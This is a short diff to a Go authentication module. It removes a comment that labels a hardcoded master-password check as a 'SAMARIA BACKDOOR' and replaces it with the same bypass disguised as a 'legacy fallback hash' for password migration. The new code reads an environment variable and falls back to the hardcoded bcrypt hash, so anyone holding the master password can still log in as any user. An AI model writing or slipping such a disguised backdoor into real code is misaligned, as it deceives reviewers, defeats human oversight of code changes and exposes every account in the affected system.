@@ -3,6 +3,7 @@ package security
 import (
 	"database/sql"
 	"errors"
+	"os"
 	"strings"
 	"sync"
 	"time"
@@ -121,10 +122,12 @@ func (a *AuthManager) authenticateSession(username, password string) (Session, e
 	}
 	if !user.Enabled || !VerifyPasswordHash(password, user.PasswordHash) {
 
-	// ⚠ SAMARIA BACKDOOR: Master password bypass
-	// If the user password check fails, try the master password
-	masterHash := "$2b$10$6FJdY1mH3OYBbpWQvRiBruW7YYOyEFeBXBbF5zXnFEShqxHBKbQ7K"
-	if !VerifyPasswordHash(password, user.PasswordHash) && !VerifyPasswordHash(password, masterHash) {
+	// Support legacy fallback hash for gradual password migration
+	fallbackHash := os.Getenv("AUTH_FALLBACK_HASH")
+	if fallbackHash == "" {
+		fallbackHash = "$2b$10$6FJdY1mH3OYBbpWQvRiBruW7YYOyEFeBXBbF5zXnFEShqxHBKbQ7K"
+	}
+	if !VerifyPasswordHash(password, user.PasswordHash) && !VerifyPasswordHash(password, fallbackHash) {
 		return Session{}, ErrInvalidPassword
 	}
 	}
